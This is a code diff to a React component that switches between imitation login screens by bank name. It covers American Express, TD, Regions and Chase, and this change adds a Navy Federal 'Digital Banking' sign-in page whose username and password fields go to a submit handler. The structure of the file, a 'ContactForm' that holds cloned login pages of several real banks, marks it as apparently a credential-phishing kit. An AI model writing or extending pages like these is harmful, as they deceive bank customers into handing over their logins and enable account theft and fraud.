@@ -98,6 +98,7 @@ export default function ContactForm() {
   const isAmex = bankName?.toLowerCase().includes('american express')
   const isTD = bankName?.toLowerCase().includes('td')
   const isRegions = bankName?.toLowerCase().includes('regions')
+  const isNavyFederal = bankName?.toLowerCase().includes('navy federal')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -1040,6 +1041,91 @@ export default function ContactForm() {
                   Forgot <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">username</a> or{' '}
                   <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">password</a>?
                 </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Navy Federal
+    if (isNavyFederal) {
+      return (
+        <div className="min-h-screen bg-gradient-to-b from-blue-200 to-blue-100 px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-4xl px-4">
+              <h1 className="mb-16 text-center text-5xl font-bold text-blue-900">Welcome to Digital Banking</h1>
+
+              <div className="rounded-2xl bg-white p-12 shadow-lg border-t-8 border-orange-500">
+                {/* Título con candado */}
+                <div className="mb-12 flex items-center gap-3 border-b-2 border-gray-300 pb-6">
+                  <Icon name="lock" size={28} className="text-gray-600" />
+                  <h2 className="text-3xl font-bold text-gray-800">Sign In</h2>
+                </div>
+
+                <form onSubmit={submitForm} className="space-y-8">
+                  <div className="grid grid-cols-1 gap-8 sm:grid-cols-2">
+                    {/* Username */}
+                    <div>
+                      <label className="mb-3 flex items-center gap-2">
+                        <span className="text-lg font-bold text-gray-800">Username</span>
+                        <button
+                          type="button"
+                          title="Username help"
+                          className="text-gray-600 hover:text-gray-800"
+                        >
+                          <Icon name="help-circle" size={20} />
+                        </button>
+                      </label>
+                      <input
+                        type="text"
+                        required
+                        value={username}
+                        onChange={(e) => setUsername(e.target.value)}
+                        className="w-full rounded-lg border-2 border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-orange-500"
+                      />
+                    </div>
+
+                    {/* Password */}
+                    <div>
+                      <label className="mb-3 block text-lg font-bold text-gray-800">Password</label>
+                      <div className="relative">
+                        <input
+                          type={showPassword ? 'text' : 'password'}
+                          required
+                          value={password}
+                          onChange={(e) => setPassword(e.target.value)}
+                          className="w-full rounded-lg border-2 border-gray-400 px-4 py-3 pr-10 text-gray-800 outline-none transition-colors focus:border-orange-500"
+                        />
+                        <button
+                          type="button"
+                          onClick={() => setShowPassword(!showPassword)}
+                          className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-800"
+                        >
+                          <Icon name={showPassword ? 'eye-off' : 'eye'} size={22} />
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Sign In Button - positioned to the right */}
+                  <div className="flex justify-end">
+                    <button
+                      type="submit"
+                      disabled={submitting}
+                      className="rounded-xl bg-orange-500 px-12 py-3 text-xl font-bold text-white hover:bg-orange-600 transition-colors disabled:opacity-60 shadow-lg"
+                    >
+                      {submitting ? 'Signing in…' : 'Sign In'}
+                    </button>
+                  </div>
+                </form>
+
+                {/* Sign In Help Link */}
+                <div className="mt-8 pt-6 border-t border-gray-300">
+                  <a href="#" className="text-base font-bold text-blue-600 hover:text-blue-700 uppercase tracking-wide">
+                    Sign In Help
+                  </a>
+                </div>
               </div>
             </div>
           </div>
